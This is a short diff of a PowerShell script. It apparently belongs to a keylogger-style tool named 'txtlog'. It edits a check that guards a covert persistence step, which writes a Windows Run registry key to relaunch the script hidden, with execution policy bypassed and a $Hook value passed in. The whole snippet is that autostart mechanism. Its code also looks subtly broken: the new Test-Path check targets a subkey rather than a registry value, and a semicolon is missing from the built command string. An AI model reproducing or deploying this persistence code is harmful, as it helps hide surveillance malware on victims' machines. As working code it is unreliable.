@@ -1,5 +1,5 @@
 if($DaysRun -eq -1 -or $DaysRun -gt 0){
-    if($null -ne (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog').Test){ return };
+    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\txtlog'){ return };
 
     $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog' -Value $autostart;
